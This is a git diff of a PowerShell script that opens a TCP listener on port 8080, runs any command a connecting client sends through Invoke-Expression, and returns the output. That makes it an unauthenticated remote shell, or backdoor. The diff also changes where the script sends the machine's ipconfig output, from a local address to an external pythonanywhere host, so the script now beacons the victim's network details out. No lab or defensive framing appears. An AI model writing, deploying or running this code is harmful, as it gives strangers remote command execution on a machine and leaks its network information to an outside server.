@@ -1,5 +1,4 @@
-Write-Host @"
-
+$asciiArt = @"
           _____                    _____                    _____                   _______                 
          /\    \                  /\    \                  /\    \                 /::\    \                
         /::\    \                /::\    \                /::\    \               /::::\    \               
@@ -17,13 +16,14 @@ Write-Host @"
    \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
     \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
      \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
-      \:::\    \               \::::::/    /                                      \::::/    /               
-       \:::\____\               \::::/    /                                        \::/____/                
-        \::/    /                \::/    /                                          ~~                      
+      \:::\    \               \::::::/    /                                      \::/____/                
+       \:::\____\               \::::/    /                                        \::/                      
+        \::/    /                \::/    /                                          \/                       
          \/____/                  \/____/                                                                   
-                                                                                                            
-
 "@
+
+# Display ASCII art on both client and host
+Write-Host $asciiArt
 
 # Set up TCP listener
 $listener = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, 8080)
@@ -38,47 +38,16 @@ while ($true) {
         $stream = $client.GetStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
-	$writer.Write("
-		
-          _____                    _____                    _____                   _______                 
-         /\    \                  /\    \                  /\    \                 /::\    \                
-        /::\    \                /::\    \                /::\    \               /::::\    \               
-        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
-         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
-          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
-           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
-           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
-  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
- /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
-/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
-\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
- \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
-  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
-   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
-    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
-     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
-      \:::\    \               \::::::/    /                                      \::::/    /               
-       \:::\____\               \::::/    /                                        \::/____/                
-        \::/    /                \::/    /                                          ~~                      
-         \/____/                  \/____/                                                                   
-                                                                                                            
+        $writer.Write("PS > $asciiArt")
+        $writer.Flush()
 
-")
         while ($client.Connected) {
-            # Display a prompt
-	
-            $writer.Write("PS > ")
-            $writer.Flush()
-
             $data = $reader.ReadLine()
             if ($data -eq $null) {
                 break
             }
 
-            # Execute command and capture the output as a string
             $output = Invoke-Expression -Command $data | Out-String
-
-            # Echo back to the client
             $writer.WriteLine($output)
             $writer.Flush()
         }
@@ -97,7 +66,7 @@ $ipConfigOutput = & ipconfig
 $ip = $ipConfigOutput.ToString()
 
 # Specify the URL and headers
-$url = "http://192.168.1.105:5000"
+$url = "https://isfooo.pythonanywhere.com/"
 $headers = @{
     "ip" = $ip
 }
@@ -113,6 +82,5 @@ if ($response.StatusCode -eq 200) {
     Write-Host "Request failed with status code $($response.StatusCode)"
     Write-Host "Response content: $($response.Content)"
 }
-
 
 $listener.Stop()
